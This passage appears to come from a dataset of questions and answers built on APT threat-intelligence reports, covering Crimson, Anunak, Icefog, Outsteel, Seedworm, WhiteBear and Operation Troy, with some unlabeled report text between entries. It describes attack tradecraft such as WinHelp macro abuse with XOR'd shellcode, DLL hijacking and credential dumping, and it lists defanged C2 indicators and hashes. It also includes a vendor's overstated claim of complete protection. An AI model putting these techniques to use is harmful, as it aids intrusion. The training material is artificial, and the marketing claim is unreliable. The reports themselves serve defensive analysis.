payloads as well as the Python/Peppy malware as shown in the graph below (Fig. 23). This activity can be further connected to the overall cluster via the Peppy, Bezigate, and Andromeda C&Cs as shown in the complete Maltego graph (Fig. 25).\nMedium Headline: Cluster 2 - guddyapps/appstertech/sajid\nSome Crimson SecApp modules we came across did not download the expected RAT or downloader payload when it first communicated to its C&C. For example, sample: 85429d5f2745d813e53b28d3d953d1cd retrieved a downloader from 178.238.228[.]113:7861 . Once the downloader was executed, it then downloaded an XMPP library (md5: fee34da6f30a17e1fcc5a49fd0987169) and the XMPP-based Trojan (md5:  d3094c89cad5f8d1ea5f0a7f23f0a2b1) we refer to as Beendoor. Beendoor is a very interesting piece of malware and we were able to gather additional information about this variant's C&C, 178.238.235[.]143.\nMuch like Crimson and Peppy, Beendoor is capable of taking screenshots of the victims desktop. On Beendoor's C&C we were able to recover a screenshot that appears to have been taken from one of the malware developer's computer (Fig. 24). In this modified screenshot we are bringing attention to a few key pieces of information:\n\u2022 Identical \"Anushka\" image on desktop found on Beendoor C&C and used in Beendoor sample\n\u2022 Folder structure similar to that found on the C&C\n\u2022 Hardcoded paths found in Beendoor dropper binary (md5: 9b98abb9a9fa714e05d43b08b76c0afa)\n\u2022 Same file names used by Beendoor and the XMPP library\nAs shown in the figure, it seems likely that the Pakistan-based company Appstertech is somehow connected to the Beendoor malware. Based on the analysis of the folders and files on the Beendoor C&C, we can also conclude that this activity is related to research published by CloudSek late last year.\nIn the Crimson samples that we found connected to Beendoor (Fig. 25), several of them used the same \"Binder\" dropper that we observed in other clusters, including Cluster 1. Moreover, the C&C for this occurrence of Crimson and Beendoor are both hosted at Contabo GmbH, another similarity with other clusters surrounding the Crimson implant.\nMedium Headline: Cluster 3 - \"Nadra attack in Mardan\" Lure\nIn addition to the attack using the recent Pathankot attack as a lure, we discovered several samples that may have been used in recent attack campaigns utilizing the December attack in Mardan near a National Database and Registration Authority (Nadra) as a lure. Several samples were uploaded to VT in compressed archives containing Crimson payloads along with possible decoys their respective droppers would have dropped. For example, one of the payloads (md5: 51c57b0366d0b71acf05b4df0afef52f, \"NADRA OFC.exe\") was uploaded to VT along with an image (md5: be0b258e6a419b926fe1cfc04f7e575a) that can also be found here: hxxp://i.dawn[.]com/ medium/2015/12/56825d6d8f1a5.png which is linked to by an article about the attack: hxxp://www.dawn[.]com/ news/1229406\nFor this cluster of activity, we're not currently aware of any droppers and so have decided to cluster it on its own. With that in mind however, the TTPs for  this campaign are nearly identical to the \"Pathankot attack lure\" campaign in Cluster 1. Unsurprisingly, the C&C utilized in this campaign is hosted at Contabo GmbH. Lastly, the port used in these samples, 11100, is the same port used by some of the samples we have grouped in Cluster 1.\nMedium Headline: Cluster 4 - DDNS and Pakistan\nThe final cluster we would like to discuss include several samples all using DDNS for their C&C pointing to Pakistan IP (according to Whois) addresses. The majority of this activity is from 2013. Based on the slightly different TTPs (purely DDNS usage) and no use of Contabo GmbH, we have clustered this separately from other activity, even though we have observed DDNS usage in Cluster 1 and the obvious overlap in tool usage. This activity is graphed in Figure 26 and included in the IOCs section.\nMedium Headline: One Cluster to Rule Them All, Nothing Yet to Bind Them...\nThere are numerous overlaps between the clusters, including usage of the \"Binder\" dropper, attack lures, and most obvious, the usage of Contabo GmbH. Unfortunately we lack information regarding some of the found samples as far as how they were used and in what campaigns, and so we have decided not to tie all the activity together. As we continue to research these incidents, we would not be surprised to find additional information linking all clusters together.\nAnswer this question: What role does the afowoblog.in domain play in the overall cluster of activity associated with the Crimson APT, and how is it connected to previous malicious activities?",
    "output": "The afowoblog.in domain is suspected to be part of the same cluster of activity due to circumstantial evidence. It was registered around the same time as the 'AFOWO Broucher 2016.xls' attachment was uploaded to VirusTotal. Additionally, the email address used for registration, thefriendsmedia@gmail.com, has historical ties to malicious activities dating back to June 2013, where it was used as a C&C for Andromeda malware. This connection is further supported by the observation of Andromeda payloads communicating with other domains like brooksidebiblefellowship.org and lolxone.com, which also hosted Bezigate and Python/Peppy malware. These interconnections suggest that afowoblog.in is part of a broader network of malicious activities involving multiple types of malware and C&C servers.",

    "instruction": "Big Headline: execuTive summAry\nThis report describes the details and type of operations carried out by an organized criminal group that focuses on financial industry, such as banks and payment providers, retail industry and news, media and PR companies. The group has its origin in more common financial fraud including theft from consumer and corporate bank accounts in Europe and Russia, using standard banking malware, mainly Carberp.\nAfter the arrests of Carberp group members in Russia, some of the members were out of work, however, their experience gained from many years of crime has allowed them to enter a new niche. One of the members quickly realized that they can steal $2000 a thousand times, and earn $2 million, but also they can steal it in one time and immediately get it with much less effort. The anti-fraud measures employed by banks has pushed the criminals to search for new ways to make money with less barriers, compromising and modifying or taking data from banks, payment providers, retail and media/ PR companies are some of these methods.\nFrom 2013 an organized criminal group intensified its activity focused on banks and electronic payment systems in Russia and in the post-Soviet space.\nThe key is that fraud occurs within the corporate network using internal payment gateways and internal banking systems. Thus money is stolen from the banks and payment systems, and not from their customers. While this is their main and most lucrative activity, the gang has also ventured into other areas including the compromise of media groups and other organizations for industrial espionage and likely a trading advantage on the stock market. In cases where the group got access to the government agency networks their aim was espionage related.\nThe organized criminal group backbone are citizens of both Russian and Ukrainian origin, but the group also sources a number of mainstream and specialized services from individuals and groups originating from Russia, Ukraine and Belarus.\nThe average sum of theft in the Russian territory and in the post-Soviet space is $2 million per incident. Since 2013 they have successfully gained access to networks of more than 50 Russian banks and 5 payment systems, and 2 of these institutions were deprived of their banking license. To date the total amount of theft is over 1 billion rubles (about 25 million dollars), most of it has been stolen in the second half of 2014.\nThe average time from the moment of penetration into the financial institutions internal network till successful theft is 42 days.\nAs a result of access to internal bank networks the attackers also managed to gain access to ATM management infrastructure and infect those systems with their own malicious software that further allows theft from the banks ATM systems on the attackers command.\nSince 2014 the organized criminal group members began actively taking an interest in US and European based retail organizations. While they were already familiar with POS malware and compromising POS terminals, the widespread media attention around the Target breach and other related breaches were the reason for this move. While the scale of breaches in this industry is still relatively low, with at least 3 successful card breaches and over a dozen retailers compromised this activity is quickly becoming a lucrative endeavor for this group.\nTo penetrate into the internal networks this organized criminal group employs targeted emailing (spear phishing) and infections sources from other botnets. This is the main reason why the group is\nkeeping in touch with owners of large botnets. Since August 2014 the group began to create their own large botnet using a mass emailing, but not using typical exploit driveby infections. This last move is likely to reduce the need for external contacts.\n\nQ: How did the Anunak APT group evolve from traditional financial fraud to targeting financial institutions directly, and what factors influenced this shift?",
    "output": "A: The Anunak APT group initially engaged in traditional financial fraud, such as stealing from consumer and corporate bank accounts using banking malware like Carberp. After the arrests of Carberp group members, some members leveraged their extensive criminal experience to target financial institutions directly. This shift was driven by the realization that stealing larger sums in fewer transactions could yield significant profits with less effort. Additionally, the increasing anti-fraud measures employed by banks pushed the criminals to seek new methods, including compromising and modifying data from banks, payment providers, retail, and media/PR companies.",

Based on the compilation date of the cpl file, it is assumed that this campaign can be traced back to November 2021.\nexecution process graph\nIn terms of analysis, looking at a CPL file is essentially identical to a DLL file. However, unlike the latter, it is automatically run when double-clicked.

These files with the extension CPL have code overlaid with LorecCPL described by the security company NSFocus.\nThe zip archive, with hash 33ddc1b13c079001eaa3514de7354019fa4d470a, was hosted on discord and contains the LorecCPL file with hash:\n3bbe45cdcc2731c0bb4751d1098eccc50f98ef66.\nThe latter is named:\n\"PDF \u2013 \u0406\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0456\u044f \u043e\u0442\u0440\u0438\u043c\u0430\u043d\u043d\u044f \u0431\u043e\u043d\u0443\u0441\u0443 \u0437\u0430 \u0432\u0430\u043a\u0446\u0438\u043d\u0430\u0446\u0456\u044e______________________-pdf.cpl\" which means \"PDF \u2013 Instructions for receiving the vaccination bonus ________________________- pdf.cpl\"\nThe LorecCPL file downloads an MSI file and installs it in the path: \"C:\\Users\\admin\\AppData\\Roaming\\3delite\\Memory Test Toolkit\".\nThe LorecCPL file is therefore only a downloader and has a structure similar to a shellcode as shown in the following figure:\nBasically, the code and the useful data are both in the text section. The return address in the stack is used to insert the address of the value that will be used by the call. The following routine is used to find the module addresses , walking the PEB structure:\nOnce the address of the library has been obtained, of course the necessary APIs will actually be resolved:\nThe function to find the library address and to resolve the API name are used few times to get the address of the APIs LoadLibraryW() and GetProcAddr(), respectively the addresses are stored in the EDI and ESI registers.

This code follows the typical LorecCPL flow, placing arguments on the stack as return addresses and using them in functions. The downloader retrieves the Outsteel infostealer from a specified URL, which is packed with the ASProtect tool to obfuscate its contents. Once downloaded, the Outsteel infostealer exfiltrates documents to a command and control (C2) server.

    "instruction": "Context: Big Headline: \u25baATTACK ANALYSIS\nThe Icefog targeted attacks rely on spear-phishing e-mails that attempt to trick the victim into opening a malicious attachment or a website.\nDuring our investigation, we identified several types of exploits being used through spear-phishing e-mails against the targets:\n> CVE-2012-1856 (the \"Tran Duy Linh\" (also see: ) exploit fixed in Microsoft's MS12-060 security bulletin)\n> CVE-2012-0158 (the MSCOMCTL.OCX remote code execution vulnerability fixed with Microsoft's MS12-027 security bulletin)\n> Web links to Oracle Java exploits (CVE-2013-0422 and CVE-2012-1723)\n> HLP exploits and abuse of features\n> HWP exploits\nThe first two vulnerabilities are exploited through Microsoft Office documents (Word and Excel) that drop and execute the backdoor and show a fake \"lure\" document to the victim. These appear to be the most common methods used by the attackers at this moment.\nMedium Headline: SPEAR-PHISHING ATTACKS - JAVA EXPLOITS\nIn addition to Microsoft Office exploits, the Icefog attackers are known to be using Java exploits, hosted online.\nFor instance, one of the malicious websites used in the attacks was \"money.cnnpolicy.com\". The Java exploit downloaded and executed an Icefog dropper from the following URL:\nwww.securimalware[dot]net/info/update.exe\nNote: This website is now SINKHOLED by Kaspersky Lab.\nThe \"update.exe\" is a standard Icefog dropper, with the following information:\nUpon execution, it installs the Icefog malware as \"sxs.dll\" in the Internet Explorer folder (usually \"C:\\ Program Files\\Internet Explorer\"):\nTo receive control, the malware DLL (\"sxs.dll\") uses a technique known as \"DLL search order hijacking\", which abuses the fact that Internet Explorer will load this file from its own directory, instead of the Windows SYSTEM folder.\nThe backdoor beams out to the command-and-control server at www.setchon[dot]com/jd/ upload.aspx\nMedium Headline: SPEAR-PHISHING ATTACKS - HLP VECTOR\nThe Icefog attackers are also using HLP files to infect their targets. The HLP files do not contain exploits but they are abusing certain Windows \"features\" to drop the malware.\nIt's interesting to know that Icefog is not the only crew to heavily use HLP \"exploits\" as a part of their toolkit. Well known, very effective APT like the \"Comments Crew\" / APT1, have included the HLP trick in their kits, along with other lesser known crews.\nThis HLP format is an older one, known as \"Winhelp\", which was natively supported up until Vista and Windows 7, when Microsoft shipped a separate Winhlp32.exe component to help phase out the technology. Most likely, the choice to abuse Winhelp indicates that the attackers have an idea of what version operating systems they are attacking.\nIn very conservative terms, this implementation of HLP files is not an \"exploit\", but instead, abuse of a poorly constructed Windows Help feature. Code and data is mixed in this file format, and the Icefog attackers abused it with custom macros.\nA fine description of \"custom macros\" and the risks of building them in to WinHelp projects is provided by Ruben Santamarta: http://reversemode.com/index2.php?option=com_content&do_ pdf=1&id=4\nSmall Headline: EXAMPLES\nLet's take a quick look at an example of how the Icefog attackers abused the provided WinHelp functionality by examining the relevant custom macros, API calls and shellcode.\nThis sample uses standard Win32 API to allocate memory with the execution flag set, copies(using long string copy) XOR'ed \"shellcode\" and calls CreateThread to transfer execution to the malicious payload.\nIn the screenshot above, \"RR\" means RegisterRoutine.\nAfter  registration, one can simply call the respective function.\nNext, the sample allocates memory with execution flag , and copies XOR'ed  \"shellcode\" . To execute the code,  a simple call to CreateThread( ) suffices:\nThe shellcode is encrypted with a simple 0xBF XOR operation:\nUpon execution, the shellcode installs an Icefog backdoor that communicates with the C2s at: \"www.samyongonc[dot]com/jd/upload.aspx\" and \"www.625tongyi[dot]com/jd/upload.aspx\"\nMedium Headline: SPEAR-PHISHING ATTACKS - HWP VECTOR\nDuring our investigation, we observed Icefog attacks using HWP files.  These are document files used by the Hangul Word Processor. According to Wikipedia, Hangul (also known as Hangul Word Processor or HWP) is a proprietary word processing application (link to: )  published by the South Korean company Hancom Inc. It is used extensively in South Korea, especially in the government sector.\nUnfortunately, we were not able to obtain any of these files, although they were used to successfully attack and infect victims.\nUsers of HWP should be aware of these exploits and update their Hangul Word Processor installation to the most recent version.\nMedium Headline: ATTACKERS' \"MODUS OPERANDI\"\nThe attack is initiated through spear-phishing e-mails, taking advantage of multiple known (already patched) vulnerabilities. Once they successfully infect a machine, the operators perform several basic functions to identify and confirm the nature of the victim:\n> List folders on disk such as \"My Documents\" and the Desktop.\n> List adapters and IP configurations.\n> Get information about the victim and their network.\nIf the victims looks \"genuine\" (they avoid working with virtual machines and \"fake\" victims) they further deploy additional software, including:\n> Type \"2\" backdoors that use a newer protocol for communication.\n> Lateral movement tools such as:\n\u2022 Password and hash dumping tools.\n\u2022 Tools to dump Internet Explorer saved passwords.\n\u2022 Tools to dump Outlook e-mail accounts and passwords.\n\u2022 Debugging tools.\n\u2022 The legitimate \"RAR\" program to compress stolen data.\nWe have documented three main types of stolen data:\n> Windows address books, .WAB files.\n> Documents, including HWP, XLS and DOC files.\n> User account credentials.\nIf stolen information represents large files, they are compressed with the popular tool WinRAR (split into volumes) or CABARC and transferred to the command-and-control part by part.\nAnswer this question: What is the significance of the Icefog APT's use of HLP files in their attacks, and how do they exploit the Winhelp functionality to deliver their payload?",
    "output": "The Icefog APT's use of HLP files is significant because it indicates their understanding of the target operating systems and their ability to exploit older, poorly constructed Windows features. The HLP files do not contain traditional exploits but abuse the Winhelp functionality to drop the malware. Specifically, the attackers use custom macros within the HLP files to allocate memory with execution flags, copy XOR'ed shellcode, and call CreateThread to transfer execution to the malicious payload. This method allows them to install an Icefog backdoor that communicates with command-and-control servers, demonstrating a sophisticated approach to bypassing traditional security measures.",

    "output": "Phishing: Spearphishing Link is a type of social engineering attack where adversaries send targeted emails with malicious links to gain access to victim systems. APT actors like Pawn Storm have been known to use spearphishing links to compromise government agencies, financial institutions, and other high-profile targets. In the case of the Netherlands-based VPS provider, Pawn Storm used the provider's servers to host C&C servers, exploit sites, and spearphishing campaigns, including credential phishing sites targeting government agencies. The VPS provider's lax security measures and willingness to host malicious activities made it an attractive option for APT actors. By using spearphishing links, Pawn Storm was able to bypass traditional email attachment defenses and trick victims into downloading malware or revealing sensitive information. The use of VPS providers like the one in the Netherlands allows APT actors to maintain a level of anonymity and makes it difficult for authorities to track and disrupt their operations.",

These documents contained a malicious macro that runs when the user clicks Enable Editing and Enable Content. Examples of these documents are shown in (<>)Figure 4.\nFigure 4:  Examples of Word Documents Used by Seedworm\nOn a computer within an IT services management company in Turkey, the group uploaded (<https://www.powershellempire.com/>)PowerShell Empire, a post-exploitation framework that allows users to run PowerShell commands without using powershell.exe, which includes modules to aid in credential stealing and data collection.\nAfter compromising a target system by installing Powermud, Seedworm first runs a tool that steals passwords saved in users' web browsers and email, demonstrating that access to the victim's email, social media, and chat accounts is one of the group's likely goals. Seedworm then uses open-source tools such as LaZagne and Crackmapexec to obtain Windows authorization credentials. Seedworm uses off-the-shelf, unmodified versions of these tools as well as custom-compiled variants, which we have determined are only used by this group.\nIn order to perform lateral movement on the victim's network, Seedworm uses a vulnerability scanner to search for Microsoft Server Message Block (SMB) remote code execution vulnerabilities on other computers in the compromised subnet ((<https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010>)see (<https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010>)security update MS17-010).\nSmall Headline: 3.4.2  Case Study 2\nThe most recent Seedworm espionage activity was seen between October 2019 and January 2020, against international public organizations, think tanks, and telcos across the U.S., Nigeria, Afghanistan, Iraq, Saudi Arabia, and Pakistan. The malware used by Seedworm in this attack is called Backdoor.Mori, which:\n\uf06e Creates and stores data within the registry under HKLM\\Software\\NFC\n\uf06e Executes commands from the operator on-demand, utilizing pipes and cmd.exe /c\n\uf06e Uses DNS tunneling to communicate with its C&C server\nExamined samples contain the following domains to be used for DNS tunneling C&C communication, one of which is picked randomly and used:\nTable 2:  Domains Used for DNS Tunneling C&C Communication\nSome variants of Backdoor.Mori communicate via HTTP with a unique identifier for the sample being used, possibly customized for the victim network\nSeedworm appears to have used Word and Excel documents as the infection vector during this attack campaign. These documents used a combination of JavaScript downloaders and PowerShell to install the Mori backdoor on victim computers. As an example, on one targeted computer Excel was observed being used to download additional components, as shown in (<>)Figure 5.\nFigure 5:  Excel Used to Download Additional Components\nMedium Headline: 3.5  Tortoiseshell\nTortoiseshell has tentative links to the Elfin group. The group has to date focused itself on performing classic supply chain attacks against Saudi Arabian organizations. The target organizations are primarily IT providers operating widely in the region. Tortoiseshell is believed to be compromising IT providers in order to gain access to their clients.\nAs part of the infection routine on one target, the attackers initially compromised a web server, installed a web shell, and then used it to deploy malware onto the network. Once on a victim computer, Tortoiseshell deploys several information gathering tools, retrieving a range of information about the computer, including IP configuration, running applications, system information, network connectivity, and so on.\nMedium Headline: 3.6  Chafer\nChafer is one of the most active Iran-linked groups in operation. Chafer has compromised a large number of organizations based in the Middle East and Europe.\nChafer appears to be primarily involved in intelligence gathering and several of its attacks, such as those against telco operators or airlines, were likely carried out to facilitate surveillance of end-user customers.\nOne of the organizations compromised by Chafer in 2017 was a telco services provider in the Middle East, which sells its solutions to multiple telco operators in the region. By moving two steps up the supply chain the attackers could potentially have carried out surveillance on a vast pool of end users. Chafer is also known to have attempted to compromise a large international travel reservations firm, indicating its mission to track movements or communication related to certain entities.\nChafer has been observed compromising victims by attacking web servers, likely through SQL injection attacks. It has also used malicious documents likely circulated using spear-phishing emails sent to individuals working in targeted organizations.\nMedium Headline: 3.7  Crambus\nCrambus has mounted operations against targets in Saudi Arabia, Israel, the United Arab Emirates, Lebanon, Kuwait, Qatar, the United States, and Turkey.\nThe group usually infects its victims with malware via spear-phishing attacks, targeting individuals within organizations of interest using malicious Office documents with embedded macros to install its backdoor. Crambus has also been known to send emails containing links to websites registered by the attackers and employ social-engineering tactics to trick victims into downloading and installing its malware.\nSmall Headline: 3.7.1  Case Study\nBetween July 2018 and June 2019, Crambus engaged in network intrusion operations against organizations in the Middle East, with a particular focus on Saudi Arabia and Kuwait.

    "instruction": "Introducing WhiteBear\nBy GReAT\nAs a part of our Kaspersky APT Intelligence Reporting subscription, customers received an update in mid-February 2017 on some interesting APT activity that we called WhiteBear. Much of the contents of that report are reproduced here. WhiteBear is a parallel project or second stage of the Skipper Turla cluster of activity documented in another private intelligence report \"Skipper Turla \u2013 the White Atlas framework\" from mid-2016. Like previous Turla activity, WhiteBear leverages compromised websites and hijacked satellite connections for command and control (C2) infrastructure. As a matter of fact, WhiteBear infrastructure has overlap with other Turla campaigns, like those deploying Kopiluwak, as documented in \"KopiLuwak \u2013 A New JavaScript Payload from Turla\" in December 2016. WhiteBear infected systems maintained a dropper (which was typically signed) as well as a complex malicious platform which was always preceded by WhiteAtlas module deployment attempts. However, despite the similarities to previous Turla campaigns, we believe that WhiteBear is a distinct project with a separate focus. We note that this observation of delineated target focus, tooling, and project context is an interesting one that also can be repeated across broadly labeled Turla and Sofacy activity.\nFrom February to September 2016, WhiteBear activity was narrowly focused on embassies and consular operations around the world. All of these early WhiteBear targets were related to embassies and diplomatic/foreign affair organizations. Continued WhiteBear activity later shifted to include defense-related organizations into June 2017. When compared to WhiteAtlas infections, WhiteBear deployments are relatively rare and represent a departure from the broader Skipper Turla target set. Additionally, a comparison of the WhiteAtlas framework to WhiteBear components indicates that the malware is the product of separate development efforts. WhiteBear infections appear to be preceded by a condensed spearphishing dropper, lack Firefox extension installer payloads, and contain several new components signed with a new code signing digital certificate, unlike WhiteAtlas incidents and modules.\nThe exact delivery vector for WhiteBear components is unknown to us, although we have very strong suspicion the group spearphished targets with malicious pdf files. The decoy pdf document above was likely stolen from a target or partner. And, although WhiteBear components have been consistently identified on a subset of systems previously targeted with the WhiteAtlas framework, and maintain components within the same filepaths and can maintain identical filenames, we were unable to firmly tie delivery to any specific WhiteAtlas component. WhiteBear focused on various embassies and diplomatic entities around the world in early 2016 \u2013 tellingly, attempts were made to drop and display decoy pdf's with full diplomatic headers and content alongside executable droppers on target systems.\nQuestion: How does the WhiteBear APT differ from previous Turla campaigns in terms of its infrastructure and targeting strategy? Why is this distinction significant for cybersecurity experts?",
    "output": "Answer: WhiteBear leverages compromised websites and hijacked satellite connections for command and control (C2) infrastructure, similar to previous Turla activity. However, it is distinguished by its narrow focus on embassies and consular operations initially, later expanding to defense-related organizations. This is a departure from the broader target set of the Skipper Turla campaign. The malware components of WhiteBear are also distinct, featuring a condensed spearphishing dropper, lacking Firefox extension installer payloads, and containing new components signed with a different code signing digital certificate. This distinction is significant because it highlights the evolving tactics and strategies of APT groups, requiring cybersecurity experts to adapt their detection and response mechanisms accordingly.",

    "instruction": "Big Headline: Linking to the Attackers\nLinking malware to its developers isn't always an easy task. Most attackers are careful enough to ensure they can't be traced. This is especially important in cases such as cyberespionage, in which the intent is to remain invisible.\nIn our analysis we observed a number of unique attributes in the components involved in these attacks; these markers allowed us to link specific samples to a specific group.\nTwo groups have taken credit for these attacks, but we can tell that the variants which wiped the systems link to the NewRomanic Cyber Army Team.\nAlthough the Whois Hacking Team is more public due to its defacement of the network provider LG +U's website, we can link this group to only one sample of a wiper, which operates differently than the others. The Whois wiper is much larger, with a file size of 236KB and was compiled March 19, whereas the other wiper components are a mere 24KB. The larger size suggests the Whois wiper contains more functions. Thus, we can definitively link NewRomanic to the samples used to wipe the MBRs of systems within the South Korean financial institution networks. NewRomanic will remain the prime suspect involved in the attacks.\nConfirming the link between NewRomanic and known wiper samples, we found a number of wiper samples contained either the string \"hastati\" or \"principes\" in the calling cards left by the attacker.\nNot only did most of the wiper samples link to NewRomanic, but the remote-access Trojan can also be linked to the group. The Trojan contained a build path that mentions Troy in the directory path, again consistent with the ancient Roman references used by this group.\nBig Headline: Code Analysis\nIt is highly unusual that two groups claim responsibility for these attacks. No further information has been revealed as to who they are or what their motivations are; this is another reason to suspect that these two groups are the same and are actually fabricated. The supporting evidence comes in the form of code analysis determining the degree of similarity between the samples.\nThe Whois Hacking Team sample was compiled March 19 at 1:57 pm local time and the NewRomanic dropper was compiled March 20 at 4:07 am local time. The attacks on South Korean banks and media and the defacement of LG +U occurred approximately 2:00 pm local time on March 20.\nMcAfee Labs investigated the differences between the two samples at a code level to determine if there were any similarities. In spite of the fact that the wiper component originating from NewRomanic Cyber Army Team was 24KB in size and the component from Whois was 236KB, we did find similarities within the code. The Whois sample is a dropper for a component that closely resembles the one used by the NewRomanic Cyber Army. We found a significant number of matching subroutines and a large number of code segments with only minor differences. These similarities lead us to conclude that the payload code is based upon the same initial code and was embedded into different droppers.\nRevealing \"Operation Troy\"\nPersistent espionage campaign in South Korea: 2009\u20132013\nPublic reports covering what is known as the Dark Seoul incident, which occurred on March 20, 2013, addressed only the MBR wiper components. Many of the details of this incident have been examined, and most analysts conclude this was an isolated, though clearly coordinated, attack. However, McAfee Labs has found that there was more to the incident than what was widely reported. Our analysis has revealed a covert espionage campaign.\nTypically this sort of advanced persistent threat (APT) campaign has targeted a number of sectors in various countries, but Operation Troy, as these attacks are now called, targets solely South Korea.\nFrom our analysis of unique attributes within the malware samples we have determined that the initial code behind the \"Troy\" family of Trojans was created in 2010, as was another component that was dropped by the Trojan HTTP Troy. The malware used in these attacks were compiled to specifically target South Korea and used Korean-language resources in the binaries. The malware connected to legitimate Korean domains that were running a bulletin board and sent a specific command to a PHP page to establish an IRC channel and receive commands.\nEspionage Campaign\nMcAfee Labs has determined that domestic espionage activities occurred before the March 20 attacks, most likely to gain intelligence regarding the targets to carry out further attacks (such as the March 20 incident) or to benefit the attackers in some other ways. This spying operation had remained hidden and only now has been discovered through diligent research and collaboration. We also suspect the attackers had knowledge of the security software running within the environment before they wiped the systems, given that some of the variants used in the attack were made to look as if they were antimalware update files from before March 20.\nThe attackers who conducted the operation remained hidden for a number of years prior to the March 20 incident by using a variety of custom tools. Our investigation into Dark Seoul has found a long-term domestic spying operation underway since at least 2009. The operation, all based on the same code, has attempted to infiltrate specific South Korean targets. We call this Operation Troy, based on the frequent use of the word Troy in the compile path strings in the malware. The prime suspect group in these attacks is the New Romanic Cyber Army Team, which makes frequent use of Roman and classical terms in their code. While analyzing malware components from before the March 20 incident we found both similar and identical attributes of the files involved that enable us to link them to the 3Rat remote administration tool client used on March 20 as well as to samples dating to 2010. Furthermore, we determined that through prior access to the victims' networks, the attackers were able to upload the MBR wiper component and distribute it. It is also possible that the campaign known as 10 Days of Rain is a byproduct of Operation Troy; some of our analysis suggests that the malware Concealment Troy was present in these attacks.\nBig Headline: NSTAR: 2010\u20132011\nNSTAR appears to be the first production version of the Troy family. This Trojan is based upon malware created for a military espionage campaign that first emerged in 2009. NSTAR is the first to use components in the same way that later variants of the Troy family do. It included a shared DLL (bs.dll) that was found in the 2010 and 2011 variants. Later variants use a modified version, HTTPSecurityProvider.dll, which employs nearly the same file-mapping function as used by bs.dll. Most of these variants are compiled from the Work directory; that's fairly consistent throughout all versions. The DLL was compiled using Microsoft Visual C++ Version 6. Those iterations were found in 2010-2011.\nThe call graph generated for NSTAR's bs.dll is identical with that of HTTP Troy. They were compiled at least a year apart from each other.\nThe DLL was compiled March 3, 2011, and includes an OCX component that was compiled in late 2010. The OCX used a very different compile path, but bs.dll, the backdoor, is essentially the same as those seen in later versions.\nThe Work directory, with path shown below, is also used with Troy variants Concealment Troy and 3Rat Client, which were both compiled in 2013.\nE:\\Work\\BackUp\\2011\\nstar_1103\\BackDoor\\BsDll-up\\Release\\BsDll.pdb\nWe also found a file-mapping function in this variant similar to those in most of the newer versions. The unique string beginning with \"FFFFFFF\" is identical and occurs throughout the later variants.\nThe malware establishes an IRC channel to receive real-time commands in the same manner as the military espionage malware.\nBig Headline: Chang and EagleXP: 2010\nAnother variant from 2010, EagleXP, is closely related to NSTAR and HTTP Troy based on reused components. EagleXP used this compile path:\nD:\\VMware\\eaglexp(Backup)\\eaglexp\\vmshare\\Work\\BsDll-up\\Release\\BsDll.pdb\nAgain we see the Work directory involved as in the other post-2010 malware used in this campaign. A variant compiled May 27, 2010, also contained a very similar compile path. We were able to obtain some traffic from the control server.\nD:\\\\Chang\\\\vmshare\\\\Work\\\\BsDll-up\\\\Release\\\\BsDll.pdb\nThe May 27 variant, called Chang, operated in the same manner as other Troy variants and used the same bs.dll. A Korean manufacturing website hosted both the control server and an IRC server.\nBoth the Chang and EagleXP variants are based on the same code that created NSTAR and later Troy variants. These similarities confirm the attackers have operated for more than three years against South Korean targets.\nBig Headline: Inside the IRC botnet\nDuring our investigation we dug into the attackers' controlling botnet, which was used until 2013. The infrastructure relied upon on a network of hacked South Korean websites hosting IRC servers. The infected clients in turn communicated with the IRC servers using RSA encryption and used functions imported from the Microsoft Cryptography API library.\nThe attackers hardcoded the control domains in bs.dll and distributed it in the final compiled Trojan code. Each variant of each generation of Trojans contained different hardcoded strings pertaining to the control servers. This shows that the attackers first compromised the future IRC server sites and then compiled the component and distributed it to infected targets.\nThe nickname for the bot can be determined by the outbound traffic and information written to the Windows registry. One variant operating in June 2010 used the nickname BS^000C2918AB11 with the password wodehaopeng. The malware joined the IRC channel #god and sent several private messages to what was likely the control server to receive instructions.\nRead the text above and answer this question: What key similarities were found between the Whois Hacking Team sample and the NewRomanic dropper during the code analysis of Operation Troy? How did these similarities contribute to the conclusion that the payload code was based on the same initial code?",
    "output": "During the code analysis of Operation Troy, McAfee Labs found significant similarities between the Whois Hacking Team sample and the NewRomanic dropper. Despite the size difference (the Whois sample being 236KB and the NewRomanic dropper being 24KB), there were a significant number of matching subroutines and a large number of code segments with only minor differences. These similarities led to the conclusion that the payload code was based on the same initial code and was embedded into different droppers.",

    "instruction": "Big Headline: Central Hosting of Clean Content\nMost RTB ad providers allow for advertisers to host their own ad content. This allows advertisers to directly collect web impression data of who is hitting which ads, from where, by which IPs, which user-agent strings, and just about anything else you could log about a website visit. In addition, the advertising network doesn't have to utilize their own disk space to host the image files, the flash videos or other online content. RTB networks simply do the auctioneering and redirection to the winning content.\nIt is this weakness in security that malvertisers are taking advantage of.  If ad networks were to switch to a model where all content is actually hosted by them (1st party hosting), in a cloud, then the risk of malvertising would drop dramatically.\nThe has a Seller's Cloud, which could be a security model for the RTB industry. It is inherently more secure way of hosting ad content.\nBig Headline: How to Protect Yourself  from Micro-targeted Malvertising\nOperation DeathClick is an active campaign to micro-target companies via malvertising in order to compromise their networks. Unfortunately, the micro-targeting malvertising technique evades almost all network controls and traditional endpoint anti-virus solutions. Invincea can protect users from this attack type among other targeted and opportunistic web-based threats. For half the price of a candy bar, attackers have the unprecedented ability to deliver malware to you through your web browser simply because of your IP address space and your industry vertical. Most of the attacks featured here were not detected by standard Anti-Virus because the malware hashes constantly change.\nWeb proxy blocking updates, even in real time, will not stop new malvertising landing pages that appear and disappear within minutes.\nIntelligence feeds from the premier intelligence providers, based on hostname, IP, URL or domain will not be able to block malicious malvertisers quickly enough.\nInvincea protected users can simply browse and click anything online without fear of compromise or targeted malvertising attacks.\nNon-Invincea users can attempt to OptOut of directed targeting where you can. European privacy laws for forcing most ad providers to offer the opt-out service; however, you often have to visit each ad provider individually to choose to opt out.\nNote, that opting out merely places a blocking cookie in your browser. This means that ad providers will not target or retarget based on cookies. But as shown above, the new targeted advertising is via IP intelligence.\n\nQ: Why are traditional network controls and endpoint anti-virus solutions ineffective against micro-targeted malvertising campaigns like Operation DeathClick? What alternative measures can be taken to protect users from such attacks?",
